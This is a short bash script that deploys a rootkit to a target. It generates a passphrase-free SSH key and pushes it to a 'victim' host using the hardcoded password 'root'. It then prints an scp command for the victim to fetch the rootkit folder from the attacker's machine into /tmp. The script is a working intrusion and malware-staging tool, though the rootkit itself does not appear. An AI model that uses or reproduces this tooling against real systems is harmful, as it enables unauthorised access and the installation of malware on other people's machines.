#!/bin/bash

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

ROOTKIT_DIR="$(realpath "$SCRIPT_DIR/../rootkit")"

TARGET_NAME=$1

TARGET_IP=$2

if [ ! -d "$ROOTKIT_DIR" ]; then
    echo "[-] Error: rootkit directory not found at $ROOTKIT_DIR"
    exit 1
fi

echo "[+] Found rootkit directory at: $ROOTKIT_DIR"

IP_ADDR=$(ip route get 1.1.1.1 | awk '{print $7; exit}')
echo "[+] Your local IP address is: $IP_ADDR"

echo "[+] Checking SSH service status..."
if systemctl is-active --quiet ssh; then
    echo "[+] SSH service is already active."
else
    echo "[-] SSH service is not active."
    read -p "Do you want to start the SSH service now? (y/n) " answer
    if [[ "$answer" =~ ^[Yy]$ ]]; then
        sudo systemctl start ssh
        echo "[+] SSH service started."
    else
        echo "[-] SSH service was not started. Aborting."
        exit 1
    fi
fi

USER_NAME=$(whoami)

printf "\n" | ssh-keygen -a 100 -N ""
# Yes the target password is hardcoded sorry
sshpass -p "root" ssh-copy-id ${TARGET_NAME}@${TARGET_IP}

echo ""
echo "Command to run on the victim machine to retrieve the rootkit folder:"
echo ""
echo "scp -r ${USER_NAME}@${IP_ADDR}:${ROOTKIT_DIR} /tmp/"
echo ""
